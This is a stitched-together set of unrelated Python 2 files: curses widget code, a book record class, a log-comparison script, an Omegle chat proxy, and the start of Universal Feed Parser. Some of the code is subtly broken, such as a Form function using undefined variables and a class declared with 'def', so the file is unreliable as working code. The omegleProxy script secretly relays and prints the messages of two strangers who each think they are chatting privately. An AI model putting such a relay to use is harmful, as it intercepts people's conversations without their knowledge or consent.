    def __init__(self, text, ch):
        self.text = text
        self.ch = ch
    def __str__(self):
        return self.text
##
# Allow user edit one line.
# @param stdscr Curses screen.
# @param width Length of editline.
# @param yx YX coordinates on curses window. Format is (y, x).
# @param text Text Text in editline. Default is none ("").
# @param binds List of functions which will be called when user press defined key. Format is [["KEY_1", funcOne], ["KEY_2", funcTwo]]. Default is [].
#              Functions gets as parameter text and act (actual cursor position). Every fucntion must return text, act.
#              Default binds in [].
# @param key_left Left key for moving with cursor. Default is "KEY_LEFT".
# @param key_left Right key for moving with cursor. Default is "KEY_RIGHT".
# @return Edited text.
def EditLine(stdscr, width, yx, text = "", binds = [], key_left = "KEY_LEFT", key_right = "KEY_RIGHT"):
    w = curses.newwin(1, width, yx[0], yx[1])
    
    stdscr.nodelay(True)
    curses.curs_set(1)
    
    act  = 0
    c    = ""
    w.addstr(0, 0, (width - 1) * " ", curses.A_UNDERLINE) # show edit field
    while c != "\n":
        # read key in non-blocking mode
        try:
            c = stdscr.getkey()
        except:
            c = ""
            
        # moving with cursor
        if c == key_left and act > 0:
            act -= 1
        if c == key_right and act < len(text):
            act += 1
            
        # bind keys
        for i in binds:
            if i[0] == c:
                text, act = i[1](text, act)
                w.erase()
                w.addstr(0, 0, (width - 1) * " ", curses.A_UNDERLINE)
                continue
            
        # backspace
        if c == "KEY_BACKSPACE" and act > 0:
            text = text[:act - 1] + text[act:]
            act -= 1
            w.erase()
            w.addstr(0, 0, (width - 1) * " ", curses.A_UNDERLINE)
            
        # delete
        if c == "KEY_DC" and act < len(text):
            text = text[:act] + text[act + 1:]
            w.erase()
            w.addstr(0, 0, (width - 1) * " ", curses.A_UNDERLINE)
                    
        # other keys
        if not c.startswith("KEY") and act < width - 2 and c != "" and c != "\n" and len(text) < width - 2:
            text = text[:act] + c + text[act:]
            act += 1
            
        # show edited text
        w.addstr(0, 0, text, curses.A_UNDERLINE)
        w.move(0, act)
        
        w.refresh()
        time.sleep(0.005)
            
    curses.curs_set(0)
    w.erase()
    w.refresh()
    
    return text

class Next():
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return "Next object."
    
class Skip():
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return "Skip."
    
class Storno():
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return "Storno."
    
class Confirmed():
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return "Confirmed."

    
class Obj():
    def __init__(self):
        self.stime = 0.001
        self.esc_key = chr(27)
        self.enter_key = "\n"
        
        ## pridat moznost borderu, parametry skrz *
    
    def run(self, func = None):
        if func == None:
            func = self.show
            
        c = ""
        func(c, True)
        self.stdscr.nodelay(True)
        while c!= self.esc_key:
            try: # read key in non-blocking mode
                c = self.stdscr.getkey()
            except:
                c = ""
            
            if c != "":
                func(c, True)
                
            time.sleep(self.stime)
            
    def getHW(self):
        return self.height, self.width
    
    def setyx(self, stdscr, y, x):
        self.stdscr = stdscr
        self.w = curses.newwin(self.height, self.width, y, x)
        self.w.refresh()
        
        return y + self.height, x + self.width

    
    
class Text(Obj):
    def __init__(self, text, modificator = None):
        Obj.__init__(self)
        self.text = text
        self.len  = len(text)
        self.width = self.len
        self.height = 1
        self.modificator = modificator
        
    def show(self, key = "", act = False):
        self.w.addstr(0, 0, self.text, self.modificator)
        
        if act:
            self.w.refresh()
            raise Next(None)
            
        self.w.refresh()
        
        
class Button(Obj):
    def __init__(self, text, value):
        Obj.__init__(self)
        self.text = text
        self.len  = len(text)
        self.value = value
        self.width  = self.len + 2
        self.height = 3
        
    def show(self, key = "", act = False):
        if act:
            if key == self.enter_key:
                self.w.refresh()
                raise Confirmed(self.value)
            self.w.addstr(0, 0, self.text, curses.A_BOLD)
        else:
            self.w.addstr(0, 0, self.text)
            
        self.w.refresh()
           
            
            
class Table(Obj):
    ## Nejak si poznamenat, jestli muze prekracovat hranice, nebo ne.
    ## Pokud ano, preda rizeni dalsimu prvku, pokud ne, nedovoli uzivateli jit dal.
    def __init__(self, stdscr, y, x, border = 0):
        Obj.__init__(self)
        self.array = []
        self.width = 0
        self.height = 0
        self.stdscr = stdscr
        self.first = True
        self.act = 0
        self.x = x
        self.y = y
        
    def add(self, line):
        twidth = 0
        for i in line:
            twidth      += i.getHW()[1]
            self.height += i.getHW()[0]
            
        if twidth > self.width:
            self.width = twidth
            
        self.array.append(line)
        
    def show(self, key = "", act = False):
        if self.first == True:
            self.w = curses.newwin(self.height, self.width, self.y, self.x)
            self.w.refresh()
            l = 0
            th = 1
            for line in self.array:
                w = 0
                for i in line:
                    t = i.setyx(self.stdscr, l, w)[0]
                    if t > th:
                        th = t
                    w += 1 + i.getHW()[1]
                    i.show()
                l += th
                th = 1
            self.first = False
        else:
            cnt = 0
            tmp = None
            for line in self.array:
                for i in line:
                    if self.act == cnt:
                        tmp = i
                        
                    i.show()
                    cnt += 1
                    
            tmp.run()
                 
                
                
##
# Prints notice on screen. User can choose from buttons, or press escape for nothing.
# @param stdscr Standard curses screen.
# @param buttons Displayed buttons. Format is list of buttons with return value ["Button text", WhatReturn]. Default is [["OK", True], ["Storno", False]].
# @param title Title. Default none ("").
# @param wrap Maximum lenght of line. Longer lines will be wrapped. Wrap function wraps also if find \n in line. Default is 30.
# @param key_left Left key for switching between buttons. Default is "KEY_LEFT".
# @param key_left Right key for switching between buttons. Default is "KEY_RIGHT".
# @param esc_key Storno key. If user press this key, functions ends and return None. Default value is ESC (chr(27)).
# @return Second index from button definition or nothing if user press esc_key.
def Form(stdscr, width, yx, stuffs, title = "", wrap = 30, esc_key = KEY_ESC):
    maxlen = 1
    for i in buttons:
        buttlen += len(i[0]) + 1 
        
    text = splitAfter(text, wrap)
    
    width = buttlen + 2     # minimal width is lenght of buttons text + spacing
    height = len(text) + 4  # minimal height is lenght of selected text + spaces + line for buttons
    
    # compute width
    for i in text:
        if len(i) + 4 > width:
            width = len(i) + 4
        
    # center window and draw it on screen
    yx = CenterWindowYX(height, width, stdscr.getmaxyx())
    w = curses.newwin(height, width, yx[0], yx[1])
    w.border(0)
    
    # print text
    cnt = 1
    for line in text:
        w.addstr(cnt, 2, line)
        cnt += 1
    w.addstr(0, 1, title)
       
    act  = 0
    c    = ""
    stdscr.nodelay(True)
    dist = ((width) - buttlen + 2) / 2 # distance for buttons
    while True:
        # read key in non-blocking mode
        try:
            c = stdscr.getkey()
        except:
            c = ""
            
        # select button
        if c == key_left and act > 0:
            act -= 1
        if c == key_right and act < len(buttons) - 1:
            act += 1
            
        # draw buttons on screen
        buttlen = dist
        for i in range(len(buttons)):
            if c == "\n":
                w.erase()
                stdscr.refresh()
                w.refresh()
                return buttons[act][1]
            
            # highlight selected button
            if act == i:
                w.addstr(len(text) + 2, buttlen, buttons[i][0], curses.A_BOLD)
            else:
                w.addstr(len(text) + 2, buttlen, buttons[i][0])
                
            buttlen += len(buttons[i][0]) + 1
            
        # if user press escape
        if c == esc_key:
            w.erase()
            stdscr.refresh()
            w.refresh()
            return None
                
        w.refresh()
        time.sleep(0.001)








        
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from kwargs_obj import KwargsObj


# Variables ===================================================================



# Functions & classes =========================================================
def Book(KwargsObj):
    def __init__(self):
        self.date = None
        self.name = None
        self.author = None
        self.pages = None
        self.book_type = None
        self.isbn = None
        self.source = None


# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import tqdm


with open("ids.txt") as f:
    ids = f.read().splitlines()

with open("broker_broker.log") as f:
    broker_log = f.read()

with open("storage38_broker.log") as f:
    storage_log = f.read()

ids_in_broker_log = set()
ids_in_storage_log = set()
ids_in_both = set()

for id in tqdm.tqdm(ids):
    if id in broker_log:
        ids_in_broker_log.add(id)

    if id in storage_log:
        ids_in_storage_log.add(id)

    if id in ids_in_broker_log and id in ids_in_storage_log:
        ids_in_both.add(id)


with open("ids_in_broker_log.txt", "w") as f:
    f.write("\n".join(sorted(ids_in_broker_log)))


with open("ids_in_storage_log.txt", "w") as f:
    f.write("\n".join(sorted(ids_in_storage_log)))


with open("ids_in_both.txt", "w") as f:
    f.write("\n".join(sorted(ids_in_both)))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# omegleProxy v1.0.0 (06.06.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in Geany text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import CheckerTools as ch
import sys
import thread
import time
import urllib
import urllib2


#===============================================================================
# Variables ====================================================================
#===============================================================================
start_url      = "http://omegle.com/start?rcs=1&spid="
event_url      = "http://omegle.com/events"
typing_url     = "http://omegle.com/typing"
send_url       = "http://omegle.com/send"
disconnect_url = "http://omegle.com/disconnect"
gid = ["", ""]


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def printCaptchaErr():
    print
    print
    print ">>> Ouch, omegle puts CAPTCHA into chat."
    print ">>> You have to manualy open http://omegle.com and pass throught CAPTCHA."
    print ">>> After that, this script will again work for some time.."
    print
    print

def getMessage(msg):
    if msg.startswith("[[\"gotMessage"):
        return msg.replace("[[\"gotMessage\", ", "")[:-3][1:]
    
    return msg.split('", "')[-1][:-3]
            
def proxy(who):
    if who < 0 or who > 1:
        raise UserWarning("Bad argument; who = " + str(who) + " (must be 0 or 1)")
        
    companion = -1
    if who == 1:
        companion = 0
    else:
        companion = 1
        
    # start conversation
    id = ch.getPage(start_url).replace("\"", "")
        
    param = {"id" : id}
    
    print "--> Thread " + str(who) + " got ID (" + id + ")"
    
    # wait until someone connect to you
    print "  * " + id + " Waiting for connection .."
    msg = ""
    while "connected" not in msg:
        msg = ch.getPage(event_url, param)
        
        if "recaptcha" in msg:
            printCaptchaErr()
            sys.exit()
            
        time.sleep(1)
        
    # save id into global variable (second instance will send messages with this id)
    gid[who] = id
    print "--> " + id + " connected to stranger"
    
    # wait for companion
    while gid[companion] == "":
        time.sleep(0.5)
    
    # do work..
    msg = ""
    cparam = {}
    while not '"strangerDisconnected"' in msg:
        try:
            msg = ch.getPage(event_url, param)
        except urllib2.URLError:
            continue
        
        # if second thread is not runinng disconnect yourself
        if gid[companion] == "":
            break

        # set cparam - companion param (could be overwriten by sending msg..)            
        cparam = {"id" : gid[companion]}
    
        # send typing msg
        if '"typing"' in msg:
            #~ print "  * " + id + " is typing"
            try:
                ch.getPage(typing_url, cparam)
            except urllib2.URLError:
                continue
            continue
            
        # send message
        if '"gotMessage"' in msg:
            msg = getMessage(msg)
            print "  <" + id + "> " + msg
            cparam["msg"] = msg
            try:
                ch.getPage(send_url, cparam)
            except urllib2.URLError:
                continue
            continue
        
        # captcha :/    
        if "recaptcha" in msg:
            printCaptchaErr()
            sys.exit()
            continue

        # if second thread is not runinng disconnect yourself
        if gid[companion] == "":
            break
    
    try:
        ch.getPage(disconnect_url, cparam)
    except:
        pass
        
    print "<-- " + id + " leaved channel"
    gid[who] = ""
            

#===============================================================================
#= Main program ================================================================
#===============================================================================
ch.IEHeaders["Referer"] = "http://omegle.com/"  # permanently change referer
ch.IEHeaders["Accept"] = "application/json"

# start conversation
try:
    thread.start_new_thread(proxy, (0,))
    proxy(1)
except KeyboardInterrupt:
    ch.getPage(disconnect_url, {"id" : gid[0]})
    ch.getPage(disconnect_url, {"id" : gid[1]})
    sys.exit()#!/usr/bin/env python
"""Universal feed parser

Handles RSS 0.9x, RSS 1.0, RSS 2.0, CDF, Atom 0.3, and Atom 1.0 feeds

Visit http://feedparser.org/ for the latest version
Visit http://feedparser.org/docs/ for the latest documentation

Required: Python 2.1 or later
Recommended: Python 2.3 or later
Recommended: CJKCodecs and iconv_codec <http://cjkpython.i18n.org/>
"""

__version__ = "4.1"# + "$Revision: 1.92 $"[11:15] + "-cvs"
__license__ = """Copyright (c) 2002-2006, Mark Pilgrim, All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice,
  this list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 'AS IS'
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE."""
__author__ = "Mark Pilgrim <http://diveintomark.org/>"
__contributors__ = ["Jason Diamond <http://injektilo.org/>",
                    "John Beimler <http://john.beimler.org/>",
                    "Fazal Majid <http://www.majid.info/mylos/weblog/>",
                    "Aaron Swartz <http://aaronsw.com/>",
                    "Kevin Marks <http://epeus.blogspot.com/>"]
_debug = 0

# HTTP "User-Agent" header to send to servers when downloading feeds.
# If you are embedding feedparser in a larger application, you should
# change this to your application name and URL.
USER_AGENT = "UniversalFeedParser/%s +http://feedparser.org/" % __version__

# HTTP "Accept" header to send to servers when downloading feeds.  If you don't
# want to send an Accept header, set this to None.
ACCEPT_HEADER = "application/atom+xml,application/rdf+xml,application/rss+xml,application/x-netcdf,application/xml;q=0.9,text/xml;q=0.2,*/*;q=0.1"

# List of preferred XML parsers, by SAX driver name.  These will be tried first,
# but if they're not installed, Python will keep searching through its own list
# of pre-installed parsers until it finds one that supports everything we need.
PREFERRED_XML_PARSERS = ["drv_libxml2"]

# If you want feedparser to automatically run HTML markup through HTML Tidy, set
# this to 1.  Requires mxTidy <http://www.egenix.com/files/python/mxTidy.html>
# or utidylib <http://utidylib.berlios.de/>.
TIDY_MARKUP = 0

# List of Python interfaces for HTML Tidy, in order of preference.  Only useful
# if TIDY_MARKUP = 1
PREFERRED_TIDY_INTERFACES = ["uTidy", "mxTidy"]

# ---------- required modules (should come with any Python distribution) ----------
import sgmllib, re, sys, copy, urlparse, time, rfc822, types, cgi, urllib, urllib2
try:
    from cStringIO import StringIO as _StringIO
except:
    from StringIO import StringIO as _StringIO

# ---------- optional modules (feedparser will work without these, but with reduced functionality) ----------

# gzip is included with most Python distributions, but may not be available if you compiled your own
try:
    import gzip
except:
    gzip = None
try:
    import zlib
except:
    zlib = None

# If a real XML parser is available, feedparser will attempt to use it.  feedparser has
# been tested with the built-in SAX parser, PyXML, and libxml2.  On platforms where the
# Python distribution does not come with an XML parser (such as Mac OS X 10.2 and some
# versions of FreeBSD), feedparser will quietly fall back on regex-based parsing.
try:
    import xml.sax
    xml.sax.make_parser(PREFERRED_XML_PARSERS) # test for valid parsers
    from xml.sax.saxutils import escape as _xmlescape
    _XML_AVAILABLE = 1
except:
    _XML_AVAILABLE = 0
    def _xmlescape(data):
        data = data.replace('&', '&amp;')
        data = data.replace('>', '&gt;')
        data = data.replace('<', '&lt;')
        return data

# base64 support for Atom feeds that contain embedded binary data
try:
    import base64, binascii
except:
    base64 = binascii = None

# cjkcodecs and iconv_codec provide support for more character encodings.
# Both are available from http://cjkpython.i18n.org/
try:
    import cjkcodecs.aliases
except:
    pass
try:
    import iconv_codec
except:
    pass

# chardet library auto-detects character encodings
# Download from http://chardet.feedparser.org/
try:
    import chardet
    if _debug:
        import chardet.constants
        chardet.constants._debug = 1
except:
    chardet = None

# ---------- don't touch these ----------
class ThingsNobodyCaresAboutButMe(Exception): pass
class CharacterEncodingOverride(ThingsNobodyCaresAboutButMe): pass
class CharacterEncodingUnknown(ThingsNobodyCaresAboutButMe): pass
class NonXMLContentType(ThingsNobodyCaresAboutButMe): pass
class UndeclaredNamespace(Exception): pass

sgmllib.tagfind = re.compile('[a-zA-Z][-_.:a-zA-Z0-9]*')
sgmllib.special = re.compile('<!')
sgmllib.charref = re.compile('&#(x?[0-9A-Fa-f]+)[^0-9A-Fa-f]')

SUPPORTED_VERSIONS = {'': 'unknown',
                      'rss090': 'RSS 0.90',
                      'rss091n': 'RSS 0.91 (Netscape)',
                      'rss091u': 'RSS 0.91 (Userland)',
                      'rss092': 'RSS 0.92',
                      'rss093': 'RSS 0.93',
                      'rss094': 'RSS 0.94',
                      'rss20': 'RSS 2.0',
                      'rss10': 'RSS 1.0',
                      'rss': 'RSS (unknown version)',
                      'atom01': 'Atom 0.1',
                      'atom02': 'Atom 0.2',
                      'atom03': 'Atom 0.3',
                      'atom10': 'Atom 1.0',
                      'atom': 'Atom (unknown version)',
                      'cdf': 'CDF',
                      'hotrss': 'Hot RSS'
                      }

try:
    UserDict = dict
except NameError:
    # Python 2.1 does not have dict
    from UserDict import UserDict
    def dict(aList):
        rc = {}
        for k, v in aList:
            rc[k] = v
        return rc

class FeedParserDict(UserDict):
    keymap = {'channel': 'feed',
              'items': 'entries',
              'guid': 'id',
              'date': 'updated',
              'date_parsed': 'updated_parsed',
              'description': ['subtitle', 'summary'],
              'url': ['href'],
              'modified': 'updated',
              'modified_parsed': 'updated_parsed',
              'issued': 'published',
              'issued_parsed': 'published_parsed',
              'copyright': 'rights',
              'copyright_detail': 'rights_detail',
              'tagline': 'subtitle',
              'tagline_detail': 'subtitle_detail'}
    def __getitem__(self, key):
        if key == 'category':
            return UserDict.__getitem__(self, 'tags')[0]['term']
        if key == 'categories':
            return [(tag['scheme'], tag['term']) for tag in UserDict.__getitem__(self, 'tags')]
        realkey = self.keymap.get(key, key)
        if type(realkey) == types.ListType:
            for k in realkey:
                if UserDict.has_key(self, k):
                    return UserDict.__getitem__(self, k)
        if UserDict.has_key(self, key):
            return UserDict.__getitem__(self, key)
        return UserDict.__getitem__(self, realkey)

    def __setitem__(self, key, value):
        for k in self.keymap.keys():
            if key == k:
                key = self.keymap[k]
                if type(key) == types.ListType:
                    key = key[0]
        return UserDict.__setitem__(self, key, value)

    def get(self, key, default=None):
        if self.has_key(key):
            return self[key]
        else:
            return default

    def setdefault(self, key, value):
        if not self.has_key(key):
            self[key] = value
        return self[key]
        
    def has_key(self, key):
        try:
            return hasattr(self, key) or UserDict.has_key(self, key)
        except AttributeError:
            return False
        
    def __getattr__(self, key):
        try:
            return self.__dict__[key]
        except KeyError:
            pass
        try:
            assert not key.startswith('_')
            return self.__getitem__(key)
        except:
            raise AttributeError, "object has no attribute '%s'" % key

    def __setattr__(self, key, value):
        if key.startswith('_') or key == 'data':
            self.__dict__[key] = value
        else:
            return self.__setitem__(key, value)

    def __contains__(self, key):
        return self.has_key(key)

def zopeCompatibilityHack():
    global FeedParserDict
    del FeedParserDict
    def FeedParserDict(aDict=None):
        rc = {}
        if aDict:
            rc.update(aDict)
        return rc

_ebcdic_to_ascii_map = None
def _ebcdic_to_ascii(s):
    global _ebcdic_to_ascii_map
    if not _ebcdic_to_ascii_map:
        emap = (
            0,1,2,3,156,9,134,127,151,141,142,11,12,13,14,15,
            16,17,18,19,157,133,8,135,24,25,146,143,28,29,30,31,
            128,129,130,131,132,10,23,27,136,137,138,139,140,5,6,7,
            144,145,22,147,148,149,150,4,152,153,154,155,20,21,158,26,
            32,160,161,162,163,164,165,166,167,168,91,46,60,40,43,33,
            38,169,170,171,172,173,174,175,176,177,93,36,42,41,59,94,
            45,47,178,179,180,181,182,183,184,185,124,44,37,95,62,63,
            186,187,188,189,190,191,192,193,194,96,58,35,64,39,61,34,
            195,97,98,99,100,101,102,103,104,105,196,197,198,199,200,201,
            202,106,107,108,109,110,111,112,113,114,203,204,205,206,207,208,
            209,126,115,116,117,118,119,120,121,122,210,211,212,213,214,215,
            216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,
            123,65,66,67,68,69,70,71,72,73,232,233,234,235,236,237,
            125,74,75,76,77,78,79,80,81,82,238,239,240,241,242,243,
            92,159,83,84,85,86,87,88,89,90,244,245,246,247,248,249,
            48,49,50,51,52,53,54,55,56,57,250,251,252,253,254,255
            )
        import string
        _ebcdic_to_ascii_map = string.maketrans( \
            ''.join(map(chr, range(256))), ''.join(map(chr, emap)))
    return s.translate(_ebcdic_to_ascii_map)

_urifixer = re.compile('^([A-Za-z][A-Za-z0-9+-.]*://)(/*)(.*?)')
def _urljoin(base, uri):
    uri = _urifixer.sub(r'\1\3', uri)
    return urlparse.urljoin(base, uri)

class _FeedParserMixin:
    namespaces = {'': '',
                  'http://backend.userland.com/rss': '',
                  'http://blogs.law.harvard.edu/tech/rss': '',
                  'http://purl.org/rss/1.0/': '',
                  'http://my.netscape.com/rdf/simple/0.9/': '',
                  'http://example.com/newformat#': '',
                  'http://example.com/necho': '',
                  'http://purl.org/echo/': '',
                  'uri/of/echo/namespace#': '',
                  'http://purl.org/pie/': '',
                  'http://purl.org/atom/ns#': '',
                  'http://www.w3.org/2005/Atom': '',
                  'http://purl.org/rss/1.0/modules/rss091#': '',
                  
                  'http://webns.net/mvcb/':                               'admin',
                  'http://purl.org/rss/1.0/modules/aggregation/':         'ag',
                  'http://purl.org/rss/1.0/modules/annotate/':            'annotate',
                  'http://media.tangent.org/rss/1.0/':                    'audio',
                  'http://backend.userland.com/blogChannelModule':        'blogChannel',
                  'http://web.resource.org/cc/':                          'cc',
                  'http://backend.userland.com/creativeCommonsRssModule': 'creativeCommons',
                  'http://purl.org/rss/1.0/modules/company':              'co',
                  'http://purl.org/rss/1.0/modules/content/':             'content',
                  'http://my.theinfo.org/changed/1.0/rss/':               'cp',
                  'http://purl.org/dc/elements/1.1/':                     'dc',
                  'http://purl.org/dc/terms/':                            'dcterms',
                  'http://purl.org/rss/1.0/modules/email/':               'email',
                  'http://purl.org/rss/1.0/modules/event/':               'ev',
                  'http://rssnamespace.org/feedburner/ext/1.0':           'feedburner',
                  'http://freshmeat.net/rss/fm/':                         'fm',
                  'http://xmlns.com/foaf/0.1/':                           'foaf',
                  'http://www.w3.org/2003/01/geo/wgs84_pos#':             'geo',
                  'http://postneo.com/icbm/':                             'icbm',
                  'http://purl.org/rss/1.0/modules/image/':               'image',
                  'http://www.itunes.com/DTDs/PodCast-1.0.dtd':           'itunes',
                  'http://example.com/DTDs/PodCast-1.0.dtd':              'itunes',
                  'http://purl.org/rss/1.0/modules/link/':                'l',
                  'http://search.yahoo.com/mrss':                         'media',
                  'http://madskills.com/public/xml/rss/module/pingback/': 'pingback',
                  'http://prismstandard.org/namespaces/1.2/basic/':       'prism',
                  'http://www.w3.org/1999/02/22-rdf-syntax-ns#':          'rdf',
                  'http://www.w3.org/2000/01/rdf-schema#':                'rdfs',
                  'http://purl.org/rss/1.0/modules/reference/':           'ref',
                  'http://purl.org/rss/1.0/modules/richequiv/':           'reqv',
                  'http://purl.org/rss/1.0/modules/search/':              'search',
                  'http://purl.org/rss/1.0/modules/slash/':               'slash',
                  'http://schemas.xmlsoap.org/soap/envelope/':            'soap',
                  'http://purl.org/rss/1.0/modules/servicestatus/':       'ss',
                  'http://hacks.benhammersley.com/rss/streaming/':        'str',
                  'http://purl.org/rss/1.0/modules/subscription/':        'sub',
                  'http://purl.org/rss/1.0/modules/syndication/':         'sy',
                  'http://purl.org/rss/1.0/modules/taxonomy/':            'taxo',
                  'http://purl.org/rss/1.0/modules/threading/':           'thr',
                  'http://purl.org/rss/1.0/modules/textinput/':           'ti',
                  'http://madskills.com/public/xml/rss/module/trackback/':'trackback',
                  'http://wellformedweb.org/commentAPI/':                 'wfw',
                  'http://purl.org/rss/1.0/modules/wiki/':                'wiki',
                  'http://www.w3.org/1999/xhtml':                         'xhtml',
                  'http://www.w3.org/XML/1998/namespace':                 'xml',
                  'http://schemas.pocketsoap.com/rss/myDescModule/':      'szf'
}
    _matchnamespaces = {}

    can_be_relative_uri = ['link', 'id', 'wfw_comment', 'wfw_commentrss', 'docs', 'url', 'href', 'comments', 'license', 'icon', 'logo']
    can_contain_relative_uris = ['content', 'title', 'summary', 'info', 'tagline', 'subtitle', 'copyright', 'rights', 'description']
    can_contain_dangerous_markup = ['content', 'title', 'summary', 'info', 'tagline', 'subtitle', 'copyright', 'rights', 'description']
    html_types = ['text/html', 'application/xhtml+xml']
    
    def __init__(self, baseuri=None, baselang=None, encoding='utf-8'):
        if _debug: sys.stderr.write('initializing FeedParser\n')
        if not self._matchnamespaces:
            for k, v in self.namespaces.items():
                self._matchnamespaces[k.lower()] = v
        self.feeddata = FeedParserDict() # feed-level data
        self.encoding = encoding # character encoding
        self.entries = [] # list of entry-level data
        self.version = '' # feed type/version, see SUPPORTED_VERSIONS
        self.namespacesInUse = {} # dictionary of namespaces defined by the feed

        # the following are used internally to track state;
        # this is really out of control and should be refactored
        self.infeed = 0
        self.inentry = 0
        self.incontent = 0
        self.intextinput = 0
        self.inimage = 0
        self.inauthor = 0
        self.incontributor = 0
        self.inpublisher = 0
        self.insource = 0
        self.sourcedata = FeedParserDict()
        self.contentparams = FeedParserDict()
        self._summaryKey = None
        self.namespacemap = {}
        self.elementstack = []
        self.basestack = []
        self.langstack = []
        self.baseuri = baseuri or ''
        self.lang = baselang or None
        if baselang:
            self.feeddata['language'] = baselang

    def unknown_starttag(self, tag, attrs):
        if _debug: sys.stderr.write('start %s with %s\n' % (tag, attrs))
        # normalize attrs
        attrs = [(k.lower(), v) for k, v in attrs]
        attrs = [(k, k in ('rel', 'type') and v.lower() or v) for k, v in attrs]
        
        # track xml:base and xml:lang
        attrsD = dict(attrs)
        baseuri = attrsD.get('xml:base', attrsD.get('base')) or self.baseuri
        self.baseuri = _urljoin(self.baseuri, baseuri)
        lang = attrsD.get('xml:lang', attrsD.get('lang'))
        if lang == '':
            # xml:lang could be explicitly set to '', we need to capture that
            lang = None
        elif lang is None:
            # if no xml:lang is specified, use parent lang
            lang = self.lang
        if lang:
            if tag in ('feed', 'rss', 'rdf:RDF'):
                self.feeddata['language'] = lang
        self.lang = lang
        self.basestack.append(self.baseuri)
        self.langstack.append(lang)
        
        # track namespaces
        for prefix, uri in attrs:
            if prefix.startswith('xmlns:'):
                self.trackNamespace(prefix[6:], uri)
            elif prefix == 'xmlns':
                self.trackNamespace(None, uri)

        # track inline content
        if self.incontent and self.contentparams.has_key('type') and not self.contentparams.get('type', 'xml').endswith('xml'):
            # element declared itself as escaped markup, but it isn't really
            self.contentparams['type'] = 'application/xhtml+xml'
        if self.incontent and self.contentparams.get('type') == 'application/xhtml+xml':
            # Note: probably shouldn't simply recreate localname here, but
            # our namespace handling isn't actually 100% correct in cases where
            # the feed redefines the default namespace (which is actually
            # the usual case for inline content, thanks Sam), so here we
            # cheat and just reconstruct the element based on localname
            # because that compensates for the bugs in our namespace handling.
            # This will horribly munge inline content with non-empty qnames,
            # but nobody actually does that, so I'm not fixing it.
            tag = tag.split(':')[-1]
            return self.handle_data('<%s%s>' % (tag, ''.join([' %s="%s"' % t for t in attrs])), escape=0)

        # match namespaces
        if tag.find(':') <> -1:
            prefix, suffix = tag.split(':', 1)
        else:
            prefix, suffix = '', tag
        prefix = self.namespacemap.get(prefix, prefix)
        if prefix:
            prefix = prefix + '_'

        # special hack for better tracking of empty textinput/image elements in illformed feeds
        if (not prefix) and tag not in ('title', 'link', 'description', 'name'):
            self.intextinput = 0
        if (not prefix) and tag not in ('title', 'link', 'description', 'url', 'href', 'width', 'height'):
            self.inimage = 0
        
        # call special handler (if defined) or default handler
        methodname = '_start_' + prefix + suffix
        try:
            method = getattr(self, methodname)
            return method(attrsD)
        except AttributeError:
            return self.push(prefix + suffix, 1)

    def unknown_endtag(self, tag):
        if _debug: sys.stderr.write('end %s\n' % tag)
        # match namespaces
        if tag.find(':') <> -1:
            prefix, suffix = tag.split(':', 1)
        else:
            prefix, suffix = '', tag
        prefix = self.namespacemap.get(prefix, prefix)
        if prefix:
            prefix = prefix + '_'

        # call special handler (if defined) or default handler
        methodname = '_end_' + prefix + suffix
        try:
            method = getattr(self, methodname)
            method()
        except AttributeError:
            self.pop(prefix + suffix)

        # track inline content
        if self.incontent and self.contentparams.has_key('type') and not self.contentparams.get('type', 'xml').endswith('xml'):
            # element declared itself as escaped markup, but it isn't really
            self.contentparams['type'] = 'application/xhtml+xml'
        if self.incontent and self.contentparams.get('type') == 'application/xhtml+xml':
            tag = tag.split(':')[-1]
            self.handle_data('</%s>' % tag, escape=0)

        # track xml:base and xml:lang going out of scope
        if self.basestack:
            self.basestack.pop()
            if self.basestack and self.basestack[-1]:
                self.baseuri = self.basestack[-1]
        if self.langstack:
            self.langstack.pop()
            if self.langstack: # and (self.langstack[-1] is not None):
                self.lang = self.langstack[-1]

